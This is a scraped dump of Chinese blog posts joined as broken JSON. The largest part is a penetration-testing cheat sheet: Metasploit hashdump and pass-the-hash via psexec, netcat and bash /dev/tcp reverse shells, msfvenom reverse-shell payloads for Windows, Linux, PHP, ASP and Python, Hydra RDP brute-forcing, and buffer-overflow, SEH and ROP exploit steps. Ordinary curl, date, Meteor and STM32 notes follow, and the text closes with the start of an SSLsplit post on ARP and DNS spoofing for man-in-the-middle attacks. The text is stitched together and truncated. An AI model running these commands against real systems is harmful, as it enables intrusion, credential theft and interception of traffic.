post/windows/gather/hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nmsf   use exploit/windows/smb/psexec\nmsf exploit(psexec)   set payload windows/meterpreter/reversetcp\nmsf exploit(psexec)   set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nmsf exploit(psexec)   exploit\nmeterpreter   shell\n使用 Hashcat 破解密码\nhashcat -m 400 -a 0 hash /root/rockyou.txt\n使用 NC 抓取 Banner 信息\nnc 192.168.0.10 80\nGET / HTTP/1.1\nHost: 192.168.0.10\nUser-Agent: Mozilla/4.0\nReferrer: www.example.com\nenter\nenter\n使用 NC 在 Windows 上反弹 shell\nc:  nc -Lp 31337 -vv -e cmd.exe\nnc 192.168.0.10 31337\nc:  nc example.com 80 -e cmd.exe\nnc -lp 80\n\nnc -lp 31337 -e /bin/bash\nnc 192.168.0.10 31337\nnc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000\n查找 SUID\\SGID root 文件\n查找 SUID root 文件\nfind / -user root -perm -4000 -print\n\n 查找 SGID root 文件:\nfind / -group root -perm -2000 -print\n\n查找 SUID 和 SGID 文件:\nfind / -perm -4000 -o -perm -2000 -print\n\n 查找不属于任何用户的文件:\nfind / -nouser -print\n\n查找不属于任何用户组的文件:\nfind / -nogroup -print\n\n 查找软连接及其指向:\nfind / -type l -ls\n\nPython shell\n\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n\nPython\\Ruby\\PHP HTTP 服务器\n\npython2 -m SimpleHTTPServer\npython3 -m http.server\nruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port =  8888, :D\n ocumentRoot =  Dir.pwd).start\"\nphp -S 0.0.0.0:8888\n获取进程对应的 PID\nfuser -nv tcp 80\nfuser -k -n tcp 80\n使用 Hydra 爆破 RDP\nhydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp\n挂载远程 Windows 共享文件夹\nsmbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw\n\nKali 下编译 Exploit\n\ngcc -m32 -o output32 hello.c (32 位)\ngcc -m64 -o output hello.c (64 位)\nKali 下编译 Windows Exploit\nwget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download\nwine mingw-get-setup.exe\nselect mingw32-base\ncd /root/.wine/drivec/windows\nwget http://gojhonny.com/misc/mingwbin.zip \u0026\u0026 unzip mingwbin.zip\ncd /root/.wine/drivec/MinGW/bin\nwine gcc -o ability.exe /tmp/exploit.c -lwsock32\nwine ability.exe\nNASM 命令\n注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。\n\nnasm -f bin -o payload.bin payload.asm\nnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload\nSSH 穿透\nssh -D 127.0.0.1:1080 -p 22 user@IP\nAdd socks4 127.0.0.1 1080 in /etc/proxychains.conf\nproxychains commands target\nSSH 穿透从一个网络到另一个网络\nssh -D 127.0.0.1:1080 -p 22 user1@IP1\nAdd socks4 127.0.0.1 1080 in /etc/proxychains.conf\nproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2\nAdd socks4 127.0.0.1 1081 in /etc/proxychains.conf\nproxychains commands target\n使用 metasploit 进行穿透\nroute add X.X.X.X 255.255.255.0 1\nuse auxiliary/server/socks4a\nrun\nproxychains msfcli windows/ PAYLOAD=windows/meterpreter/reversetcp LHOST=IP LPORT=443 RHOST=IP E\n或者\nhttps://www.offensive-security.com/metasploit-unleashed/pivoting/\nmeterpreter   ipconfig\nIP Address  : 10.1.13.3\nmeterpreter   run autoroute -s 10.1.13.0/24\nmeterpreter   run autoroute -p\n10.1.13.0          255.255.255.0      Session 1\nmeterpreter   Ctrl+Z\nmsf auxiliary(tcp)   use exploit/windows/smb/psexec\nmsf exploit(psexec)   set RHOST 10.1.13.2\nmsf exploit(psexec)   exploit\nmeterpreter   ipconfig\nIP Address  : 10.1.13.2\n基于 CSV 文件查询 Exploit-DB\ngit clone https://github.com/offensive-security/exploit-database.git\ncd exploit-database\n./searchsploit –u\n./searchsploit apache 2.2\n./searchsploit \"Linux Kernel\"\n\ncat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep \"\u003c|\u003c=\" | sort -k3\nMSF Payloads\nmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address X   system.exe\nmsfvenom -p php/meterpreter/reversetcp LHOST=IP Address LPORT=443 R   exploit.php\nmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e -a x86 --platform win -f asp -o file.asp\nmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e x86/shikataganai -b \"\\x00\" -a x86 --platform win -f c\nMSF 生成在 Linux 下反弹的 Meterpreter Shell\nmsfvenom -p linux/x86/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e -f elf -a x86 --platform linux -o shell\nMSF 生成反弹 Shell (C Shellcode)\nmsfvenom -p windows/shellreversetcp LHOST=127.0.0.1 LPORT=443 -b \"\\x00\\x0a\\x0d\" -a x86 --platform win -f c\nMSF 生成反弹 Python Shell\nmsfvenom -p cmd/unix/reversepython LHOST=127.0.0.1 LPORT=443 -o shell.py\nMSF 生成反弹 ASP Shell\nmsfvenom -p windows/meterpreter/reversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -f asp -a x86 --platform win -o shell.asp\nMSF 生成反弹 Bash Shell\nmsfvenom -p cmd/unix/reversebash LHOST=Your IP Address LPORT=Your Port to Connect On -o shell.sh\nMSF 生成反弹 PHP Shell\nmsfvenom -p php/meterpreterreversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -o shell.php\nadd \u003c?php at the beginning\nperl -i~ -0777pe's/^/\u003c?php \\n/' shell.php\nMSF 生成反弹 Win Shell\nmsfvenom -p windows/meterpreter/reversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -f exe -a x86 --platform win -o shell.exe\nLinux 常用安全命令\n 使用 uid 查找对应的程序\nfind / -uid 0 -perm -4000\n\n查找哪里拥有写权限\nfind / -perm -o=w\n\n 查找名称中包含点和空格的文件\nfind / -name \" \" -print\nfind / -name \"..\" -print\nfind / -name \". \" -print\nfind / -name \" \" -print\n\n查找不属于任何人的文件\nfind / -nouser\n\n 查找未链接的文件\nlsof +L1\n\n获取进程打开端口的信息\nlsof -i\n\n 看看 ARP 表中是否有奇怪的东西\narp -a\n\n查看所有账户\ngetent passwd\n\n 查看所有用户组\ngetent group\n\n列举所有用户的 crontabs\nfor user in $(getent passwd|cut -f1 -d:); do echo \" Crontabs for $user ####\"; crontab -u $user -l; done\n\n生成随机密码\ncat /dev/urandom| tr -dc ‘a-zA-Z0-9-!@$%^\u0026()+{}|:?=’|fold -w 12| head -n 4\n\n查找所有不可修改的文件\nfind . | xargs -I file lsattr -a file 2  /dev/null | grep ‘^….i’\n\n 使文件不可修改\nchattr -i file\nWindows 缓冲区溢出利用命令\nmsfvenom -p windows/shellbindtcp -a x86 --platform win -b \"\\x00\" -f c\nmsfvenom -p windows/meterpreter/reversetcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikataganai -b \"\\x00\" -f c\n\nCOMMONLY USED BAD CHARACTERS:\n\\x00\\x0a\\x0d\\x20                              For http request\n\\x00\\x0a\\x0d\\x20\\x1a\\x2c\\x2e\\3a\\x5c           Ending with (0\\n\\r)\n\n常用命令:\npattern create\npattern offset (EIP Address)\npattern offset (ESP Address)\nadd garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )\n\n!pvefindaddr patterncreate 5000\n!pvefindaddr suggest\n!pvefindaddr modules\n!pvefindaddr nosafeseh\n\n!mona config -set workingfolder C:\\Mona\\%p\n!mona config -get workingfolder\n!mona mod\n!mona bytearray -b \"\\x00\\x0a\"\n!mona pc 5000\n!mona po EIP\n!mona suggest\nSEH – 结构化异常处理\n\n注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。\n https://en.wikipedia.org/wiki/Microsoft-specificexceptionhandlingmechanisms#SEH\nhttp://baike.baidu.com/view/243131.htm\n!mona suggest\n!mona nosafeseh\nnseh=\"\\xeb\\x06\\x90\\x90\" (next seh chain)\niseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)\nROP (DEP)\n\n注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。\n\nDEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。\n https://en.wikipedia.org/wiki/Return-orientedprogramming\nhttps://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B\n https://en.wikipedia.org/wiki/DataExecutionPrevention\nhttp://baike.baidu.com/item/DEP/7694630\n!mona modules\n!mona ropfunc -m .dll -cpb \"\\x00\\x09\\x0a\"\n!mona rop -m .dll -cpb \"\\x00\\x09\\x0a\" (auto suggest)\nASLR – 地址空间格局随机化\n https://en.wikipedia.org/wiki/Addressspacelayoutrandomization\nhttp://baike.baidu.com/view/3862310.htm\n!mona noaslr\n寻蛋(EGG Hunter)技术\n\nEgg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。\n https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/\nhttp://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf\n http://www.fuzzysecurity.com/tutorials/expDev/4.html\n!mona jmp -r esp\n!mona egg -t lxxl\n\\xeb\\xc4 (jump backward -60)\nbuff=lxxllxxl+shell\n!mona egg -t 'w00t'\nGDB Debugger 常用命令\n设置断点\nbreak start\n\n 执行下一个命令\nnext\nstep\nn\ns\n\n继续执行\ncontinue\nc\n\n 数据\nchecking 'REGISTERS' and 'MEMORY'\n\n显示寄存器的值: (Decimal,Binary,Hex)\nprint /d –  Decimal\nprint /t –  Binary\nprint /x –  Hex\nO/P :\n(gdb) print /d $eax\n$17 = 13\n(gdb) print /t $eax\n$18 = 1101\n(gdb) print /x $eax\n$19 = 0xd\n(gdb)\n\n 显示特定内存地址的值\ncommand : x/nyz (Examine)\nn –  Number of fields to display ==  y –  Format for output ==  c (character) , d (decimal) , x (Hexadecimal)\nz –  Size of field to be displayed ==  b (byte) , h (halfword), w (word 32 Bit)\nBASH 反弹 Shell\nbash -i   \u0026 /dev/tcp/X.X.X.X/443 0  \u00261\n\nexec /bin/bash 0\u00260 2  \u00260\nexec /bin/bash 0\u00260 2  \u00260\n\n0\u0026196;exec 196","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/bufio","title":"golang中bufio包的用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 curl","title":"Linux命令 curl","text":"---\ncurl like tools\nhttpie pyton\nbat    go\n\n无参\n-L, --location      Follow redirects (H)                         [重定向]\n-C, --continue-at OFFSET  Resumed transfer OFFSET                [断点续传]\n-I, --head          Show document info only                      [显示返回数据(response)头信息 -X HEAD  ResponseHeader]\n-i, --include       Include protocol headers in the output (H/F) [返回数据(response) 的header          ResponseHeader + body]\n-v, --verbose       Make the operation more talkative            [请求/返回数据头信息                   Request ]\n-s, --silent        Silent mode (don't output anything)\n 参数设定\n-X, --request [GET|POST|HEAD|PUT|DELETE|OPTIONS|PATCH]           [请求类型 ]\n-x, --proxy [PROTOCOL://]HOST[:PORT]  Use proxy on given port    [使用代理]\n\n头信息设置\n-H, --header                           設定request裡的header\n-H, --header LINE   Pass custom header LINE to server (H)\n    http Content-Type\n-A, --user-agent STRING  Send User-Agent STRING to server (H) [ -A curl/7.47.1 ]\n    [-H \"User-Agent: curl/7.47.1\"]\n-e, --referer       Referer URL (H)                           [ -e www.baidu.com ]\n    [-H \"Referer: www.baidu.com\"]\n-u, --user USER[:PASSWORD]  Server user and password          [  -u user:passwd ]\n  [-H \"Authorization: Basic dXNlcjpwYXNzd2Q=\"]  \n  echo -n user:passwd|base64 dXNlcjpwYXNzd2Q=\n\n 主体设置\n-d, --data DATA     HTTP POST data (H)  [http POST parameters]\n    [-d \"param1=value1\u0026param2=value2\" == -d \"param1=value1\" -d \"param2=value2\"]\n    [-d @filename]                上传文件\n-b, --cookie STRING/FILE  Read cookies from STRING/FILE (H) [使用cookie 与 -D -c 配合使用]\n-F, --form CONTENT  Specify HTTP multipart POST data (H)\n [ -F \"fileupload=@filename.txt\"] form表单\n输出\n-D, --dump-header FILE  Write the headers to FILE 【head输出】\n-c, --cookie-jar FILE  Write cookies to FILE after operation (H) 【仅cookie输出】\n-o, --output FILE   Write to FILE instead of stdout  【内容输出】\n-O, --remote-name   Write output to a file named as the remote file 【内容输出 自动命名】\n\ncurl -O -L -x localhost:8087 -k https://github.com/git-for-windows/git/releases/download/v2.8.2.windows.1/Git-2.8.2-64-bit.exe\ncurl -O -sSL -x localhost:8087 -k https://dl.google.com/dl/android/studio/ide-zips/2.2.0.1/android-studio-ide-145.2915834-windows.zip\ncurl -O -sSL -x localhost:8087 -k https://portswigger.net/DownloadUpdate.ashx?Product=Free\n\n 网络测试\ncurl -I www.baidu.com          # -I 只显示头信息\ncurl -d \"value=1\" \"\"           # -d 请求方式POST\ncurl -X DELETE \"\"              # -X 选项指定其它协议\n\n文件下载\ncurl -O \"url/install.sh\"        -O  下载并保存文件\ncurl -C- -O \"url/install.sh\"   # -C- 断点续传\ncurl -x proxy:sever \"http://\"  # -x  代理访问http 网站\ncurl -x ip:port -k \"https://\"  # -x -k 代理访问https网站\ncurl -L \"http://\"              # -L  强制重定向(HTTP Location headers)\ncurl -T \"img.png\" \"http://\"    # -T  文件上传 -T \"{file1,file2}\"\ncurl -k\ncurl -H \"Content-Type: application/json\" # -H 设定header信息","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29 Meteor 常见问题","title":"Meteor","text":"---\nMeteor Session is not defined\n\nMeteor Session is not defined\n\n之所以会产生这样的问题，是因为包含有Session的代码被server加载了，而 Session只是在client服务，那什么时候用了Session的代码会被server加载呢，\n\n这就要对Meteor的文件加载规则有所了解了。根据Meteor文件加载规则，除了client和test文件夹之外的所有文件夹都会在server加载。所以如果你的Session是在这样的\n\n目录结构下的文件的话，就会导致Meteor Session is not defined。\n\nclient","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 cut","title":"Linux命令 curl","text":"---\n\n一点黑魔法：Linux 中对纯文本文件的列操作\n\n如果你经常和数据打交道，那么你肯定会经常需要对列进行操作。在 Linux 中，对纯文本文件的列操作有两个十分有用的命令：cut 和 paste。其中 cut 主要用于从纯文本文件中取出某些列，paste 则可以用于按列合并。\n\ncut 命令","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-29 服务器 MQTT消息推送mosquitto","title":"利用Nginx搭建http和rtmp协议的流媒体服务器","text":"sudo apt-get install mosquitto","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 date","title":"Linux命令 date","text":"CST=UTC+8=GMT+8\nCST:中国标准时间（China Standard Time)  等价于\nUTC:世界标准时间(Universal Time/Temps Cordonn\u0026eacute) + 8\nGMT：格林尼治标准时间(Greenwich Mean Time) 等于UTC时间\nPST是太平洋标准时间（西八区），与北京时间（东八区）时差-16个小时，也就是北京时间减去16就是PST时间。而PDT比PST早1个小时，就是说PDT与北京时间时差为-15小时\n\n输出UTC时间\ndate --iso-8601=s -u\n2017-09-27T10:19:07+00:00\n\ndate  --iso-8601=s 等价 date +%FT%T%z\n2017-09-27T18:01:25+08:00\n\ndate --rfc-3339=s\n2017-09-27 18:01:40+08:00\n\ndate --rfc-2822\nWed, 27 Sep 2017 18:01:55 +0800\n\n  ANSIC       = \"Mon Jan 2 15:04:05 2006\"\n   UnixDate    = \"Mon Jan 2 15:04:05 MST 2006\"\n   RubyDate    = \"Mon Jan 02 15:04:05 -0700 2006\"\n   RFC822      = \"02 Jan 06 15:04 MST\"\n   RFC822Z     = \"02 Jan 06 15:04 -0700\" // 使用数字表示时区的RFC822\n   RFC850      = \"Monday, 02-Jan-06 15:04:05 MST\"\n   RFC1123     = \"Mon, 02 Jan 2006 15:04:05 MST\"\n   RFC1123Z    = \"Mon, 02 Jan 2006 15:04:05 -0700\" // 使用数字表示时区的RFC1123\n   RFC3339     = \"2006-01-02T15:04:05Z07:00\"\n   RFC3339Nano = \"2006-01-02T15:04:05.999999999Z07:00\"\n   Kitchen     = \"3:04PM\"\n   // 方便的时间戳\n   Stamp      = \"Jan 2 15:04:05\"\n   StampMilli = \"Jan 2 15:04:05.000\"\n   StampMicro = \"Jan 2 15:04:05.000000\"\n   StampNano  = \"Jan 2 15:04:05.000000000\"\n\nTIMESTART=\"$(date +%s)\" 1509691531     现实unix时间戳\nDOWEEK=\"$(date +'%u')\"   5              #显示星期\nHOSTNAME=\"$(hostname)\"\n\ndate //显示当前日期\ndate -s //设置当前时间，只有root权限才能设置，其他只能查看。\ndate -s 20061010 //设置成20061010，这样会把具体时间设置成空00:00:00\n date -s 12:23:23 //设置具体时间，不会对日期做更改\ndate -s “12:12:23 2006-10-10″ //这样可以设置全部时间\n\ndate -d next-day +%Y%m%d\n20060328\n date -d last-day +%Y%m%d\n20060326\ndate -d yesterday +%Y%m%d\n20060326\n date -d tomorrow +%Y%m%d\n20060328\ndate -d last-month +%Y%m\n200602\n date -d next-month +%Y%m\n200604\ndate -d next-year +%Y\n2007\n\n%F   full date; same as %Y-%m-%d\n%T   time; same as %H:%M:%S\n\ndate \"+%Y%m%d%H%M\"\n201701021145\n\ndate \"+%Y-%m-%d %H:%M:%S\" [2016-01-06 16:46:14]\n\n(date +'%Y-%m-%d %H:%M')\"  2016-06-25 23:59\n[root@root ~]# date \"+%Y-%m-%d\"  \n2013-02-19  \n[root@root ~]# date \"+%H:%M:%S\"  \n13:13:59  \n[root@root ~]# date \"+%Y-%m-%d %H:%M:%S\"  \n2013-02-19 13:14:19  \n[root@root ~]# date \"+%Y%m%d %H:%M:%S\"    \n201302_19 13:14:58  \n[root@root ~]# date -d today   \nTue Feb 19 13:10:38 CST 2013  \n[root@root ~]# date -d now  \nTue Feb 19 13:10:43 CST 2013  \n[root@root ~]# date -d tomorrow  \nWed Feb 20 13:11:06 CST 2013  \n[root@root ~]# date -d yesterday  \nMon Feb 18 13:11:58 CST 2013  \n\n%H 小时(以00-23来表示)。\n%I 小时(以01-12来表示)。\n%K 小时(以0-23来表示)。\n%l 小时(以0-12来表示)。\n%M 分钟(以00-59来表示)。\n%P AM或PM。\n%r 时间(含时分秒，小时以12小时AM/PM来表示)。\n%s 总秒数。起算时间为1970-01-01 00:00:00 UTC。\n%S 秒(以本地的惯用法来表示)。\n%T 时间(含时分秒，小时以24小时制来表示)。 %H:%M:%S\n%X 时间(以本地的惯用法来表示)。\n%Z 市区。\n%a 星期的缩写。\n%A 星期的完整名称。\n%b 月份英文名的缩写。\n%B 月份的完整英文名称。\n%c 日期与时间。只输入date指令也会显示同样的结果。\n%d 日期(以01-31来表示)。\n%D 日期(含年月日)。\n%j 该年中的第几天。\n%m 月份(以01-12来表示)。\n%U 该年中的周数。\n%w 该周的天数，0代表周日，1代表周一，异词类推。\n%x 日期(以本地的惯用法来表示)。\n%y 年份(以00-99来表示)。\n%Y 年份(以四位数来表示)。\n%n 在显示时，插入新的一行。\n%t 在显示时，插入tab。\nMM 月份(必要)\nDD 日期(必要)\nhh 小时(必要)\nmm 分钟(必要)\nss 秒(选择性)\n选择参数:\n-d字符串 　显示字符串所指的日期与时间。字符串前后必须加上双引号。\n-s字符串 　根据字符串来设置日期与时间。字符串前后必须加上双引号。\n-u 　显示GMT。","tags":null},{"location":"//blog.pytool.com/Hardware/2015-12-09 STM32-定时器","title":"STM32_定时器","text":"最近做项目，用到定时器，索性重新学习一下，以前只是用于简单的pwm生成和中断处理，对定时器根本就没有进行深入研究，今天借此机会，重新学习一下高级定时器，只要高级定时器学会了，基本定时器也就没什么问题了。总体上来说，stm32的定时器，功能非常多。看了一下，大概有20个功能。我就按照数据手册，一一的重新学习一下。\n\n首先是框图，娘的，看着就眼晕\n1、时基：包含计数器寄存器(TIMxCNT) 预分频器寄存器 (TIMxPSC) 自动装载寄存器 (TIMxARR) 重复次数寄存器 (TIMxRCR)\n     计数类似于51单片机中的TH1和TL1。预分频器就是将输入时钟进行降低。重复寄存器类似与51中的自动装载模式中的TH寄存器。最后一个寄存器与产生更新时间UEV与影子寄存器有关。UEV时间更新，对于预分频寄存器来说，他可以看成两个寄存器，一个叫可读写的，一个叫缓冲的，预分频是根据缓冲为标准的，设置的时候，将数据写入可读写，然后等待UEV时间的到来，在将可读写的写入缓冲来更新。这就是UEV的作用。影子寄存器主要是防止多通道时序错误的问题。\n有兴趣的可以看一下   http://blog.163.com/liuyunqian@yeah/blog/static/70395843201043094819579/\n 2、计数器模式：\n向上，向下，上下计数\n     向上计数从0开始，到TIMxAPR，产生溢出，溢出时产生UEV，然后更新影子寄存器。若设置了TIMxRCR，则到TIMxRCR时即产生UEV。否则只能到溢出时产生UEV。\n     向下计数从TIMxAPR递减到0，产生溢出，对于UEV和上面类似\n     中央对齐模式：从0递增到TIMxAPR-1，产生溢出，然后在递减到0，产生下溢。有1、2、3，三种模式，其中2、3和UIF有关\n3、重复计数器：\n产生UEV。对PWM和输入捕获很有用处。\n 4、时钟源：\n    1、内部时钟。\n    2、外部时钟模式1：外部输入引脚 外部时钟模式2：外部触发输入ETR\n    3、内部触发输入(ITRx)：使用一个定时器作为另一个定时器的预分频器。如可以配置一个定时器Timer1而作为另一个定时器Timer2的预分频器。\n5、捕获比较通道：\n主要多用于计频和pwm输出。t1和t8高级定时器通道中含有死区控制，使用时可设置。\n对于时间测量：一个方法是测频率，另一个是测周期，测频率在限定的时间内（如1秒钟）检测脉冲的个数，测周期测试限定的脉冲个数之间的时间。\n考虑的问题：\n(1)、系统时钟：频率与精度，(2)、计数器位数，一般为16位，可以产生的限定时间越长，或在限定时间里记录的脉冲个数越多。(3)、被测频率的范围，低频检测两个脉冲时间，高频在一定时间内检测脉冲个数。(4)、中断响应与软件算法。\n 6、输入捕获模式：\n（1）配置TIMx的CCRx为输入模式，即TIMx-  CCMRx的0和1位为 \"0x01\" \"0x02\" 或\"0x03\"。（2）配置输入滤波器，即TIMx-  CCMRx的4-7位或15-12位。（3）配置通道的有效转换边沿，即TIMx-  CCER的\"1\",\"5\",\"9\",\"13\"位，0为上升沿，1为下降沿。（4）配置预分频器，TIMx-  CCMRx的第2-3位或第11-10位。（5）设置TIMx-  CCER的\"0\",\"4\",\"8\",\"12\"位（6）设置TIMx-  DIER的中断允许位。\n对于输入捕获，应该是在中断中进行处理。 可以计算高低电平的时间，同时也可以针对红外解码进行编程配置。\n当检测到捕获后进入中断开始处理。也可进入dma，或读取CCRx。\n7，PWM输入：\n对于PWM输入，主要是测频率与测占空比。配置时，把1个引脚触发映射到两个CCRx中去，同时，将两个CCR配置成为边沿极性相反输入，这样的话，可以一个用来计频率，另一用来计占空比。当频率边沿跳变时，记录周期与占空比后，计数器清零，然后计算具体数据。\n 8，强置输出模式：\n通过设置CCMR寄存器，可以使OCxREF强制为高或低一种状态。且计数器和比较器仍在工作，并产生中断或DMA。\n9，输出比较模式\n图片\n 10，PWM模式：\nTIMxARR决定周期周期，CCRx决定占空比。cnt计数到CCRx时，跳变电平。4路的占空比，可以独立设置。\n11，单脉冲模式：\n从模式启动，在 输出比较 或者 PWM 下产生波形。\n 12，在外部事件时清除OCxREF信号，外加比较器，可用于控制电流。\n例|：外部触发预分频器必须处于关闭，必须禁止外部时钟模式2：TIMxSMCR寄存器中的ECE=’0’。外部触发极性(ETP)和外部触发滤波器(ETF)可以根据需要配置。\n13，编码器接口模式：\n用于编码器的脉冲和相位测量，在第一通道和第二通道中设置。对于编码器而言，有A、B两相相差90度，可通过比较A相在前还是B相在前，以判别编码器的正转与反转，通过零位脉冲，可获得编码器的零位参考位。并且可以测量两个编码器事件的间隔，获得动态的信息(速度，加速度，减速度)等。\n我们假定配置如下： ● CC1S=’01’ (TIMxCCMR1寄存器，IC1FP1映射到TI1) ● CC2S=’01’ (TIMxCCMR2寄存器，IC2FP2映射到TI2) ● CC1P=’0’ (TIMxCCER寄存器，IC1FP1不反相，IC1FP1=TI1) ● CC2P=’0’ (TIMxCCER寄存器，IC2FP2不反相，IC2FP2=TI2) ● SMS=’011’ (TIMxSMCR寄存器，所有的输入均在上升沿和下降沿有效). ● CEN=’1’ (TIMxCR1寄存器，计数器使能)\n 14，定时器输入异或功能\nTIMxCR2寄存器中的TI1S位，允许通道1的输入滤波器连接到一个异或门的输出端，异或门的3个输入端为TIMxCH1、TIMxCH2和TIMxCH3。 13.3.18异或输出能够被用于所有定时器的输入功能，如触发或输入捕获。下节给出了此特性用于连接霍尔传感器的例子。\n15，霍尔传感器\n定时器输入异或的应用，用于电机的测速。他可以映射到通用定时器，T2-T5，用T1或T8来控制电机。\n 16，TIMx定时器和外部触发的同步\nTIMx定时器能够在多种模式下和一个外部的触发同步：复位模式、门控模式和触发模式。\n复位模式：能在外部触发时，使计数器复位。\n门控模式：按照选中的输入端电平使能计数器。\n触发模式：输入端上选中的事件使能计数器\n外部时钟模式2可以与另一种从模式(外部时钟模式1和编码器模式除外)一起使用。这时，ETR信号被用作外部时钟的输入，在复位模式、门控模式或触发模式可以选择另一个输入作为触发输入。不建议使用TIMxSMCR寄存器的TS位选择ETR作为TRGI。\n17：定时器同步\n使一个定时器作为另一个定时器的预分频器。使用一个定时器使能另一个定时器（如：定时器2的使能由定时器1的输出比较控制）使用一个定时器去启动另一个定时器。使用一个外部触发同步地启动2个定时器。\n 18：调试模式，具体就不去讨论了。\n总体上来说，STM32的定时器功能非常多，也非常复杂，加入了电机控制的一些功能。初步的大概也就这意思。至于如何使用，还要在项目中细细研究。","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29  Meteor前端选 Blaze,Angular还是React","title":"Meteor","text":"从 Meteor 1.2 开始，这三个框架都是官方支持的了。如果你开始一个新的 Meteor 项目，还没有确定用什么前端框架的时候，估计会遇到这个问题。\nBlaze\n\nBlaze 是这三个里最简单的，特别是用过 Handlebar 的话。几乎没有什么 learning curve，直观、容易上手。它的问题是除非你只用 Meteor，否则当你改用别的后端框架时，你得使用别的前端框架，所以不如另外两个应用广泛。技能市场更小。\nAngular vs React\n\n其实这两者不好放在一起比较。因为 React 只涉及 View，而 Angular 是一个完整的前端框架。这里只是比较他们作为 View 的场景。\n\n我曾经是一个 React 黑。因为 React 咋一看把啥都混在一起写。HTML，CSS 和 JavaScript 混在一个文件里，搞点语法糖，取名叫 JSX。还看到有人说“ JSX：让人无法想像的历史倒退，W3C通过20年将 “布局、样式、数据” 三者分离，Facebook只花了几个月就能合并到一起了。” 当时觉得无比赞同。也有部分原因是自己已经对 Angular 投入了很多时间学习使用。人都是这样，对你用顺手了并且擅长的工具就会更喜欢，即使有更好的新工具出来。\n\n后来遇到好多写了多年前端的人几乎都是一致推荐 React。JSX 虽然刚开始看起来恶心，但还真是起到解耦和封装的作用，比只是简单地把文件分开的解耦更高级，达到逻辑了上的封装。而 Angular，更符合后端转前端的人的思维，不同语言分开，大而全的 framework，脏检查，双向绑定等等，都是老思维了。难怪 React 一出来基本就是压倒性的受欢迎。\n\nReact 设计的理念肯定是超过 Angular 1.0 的。React 的组件化，单向数据流和 Virtual Dom 是前端演化的方向。据说 Angular 2.0 也会有这些。但是 Angular 2.0 居然选择 TypeScript。个人认为这是一步臭棋，把 learning curve 又提高了。不知道他们团队怎么想的，估计以为 ES6/7 遥遥无期，和微软合作时作为交换筹码？\n\nMeteor 可以作为 React 的一种 Flux 实现，他们两者的 Reactive 特性是很匹配的。Angular 1.0 虽然号称也可以做到，但是实现并不理想。比如在异步时你得自己使用 $digest 来手动更新；脏检查机制给 reactivity 带来性能上的问题等等。\n结论\n\n如果不是维护历史项目，首选 React。要快速上手 Meteor 可以先使用 Blaze。\n\n1","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 sslsplit","title":"sslsplit","text":"http://www.roe.ch/SSLsplit\n\n原文：http://blog.philippheckel.com/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/\n\nmitmproxy对https连接的数据抓取很完美。但是，它不能理解其他基于TLS/SSL的流量，比如FTPS, SMTP over SSL, IMAP over SSL等。\n\nSSLsplit 是一个通用的透明TLS/SSL代理， 可以执行中间人攻击。\n\n使用SSLsplit,可以监听和保存所有基于SSL的流量\n\n1.工作原理\nSSLsplit同其他透明SSL代理工具类似：它扮演了一个在客户端和实际的服务器间的中间人。\n所有的流量都被转向(redirect)到SSLsplit运行的那台服务器上（通过改变默认的网关， ARP欺骗或者其他方式)\n\n转向流量\n1）使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。\n你不需要物理访问受害者的设备就能做到。\n2）手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法\n3) DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。\n4）修改受害者机器的/etc/hosts的条目来 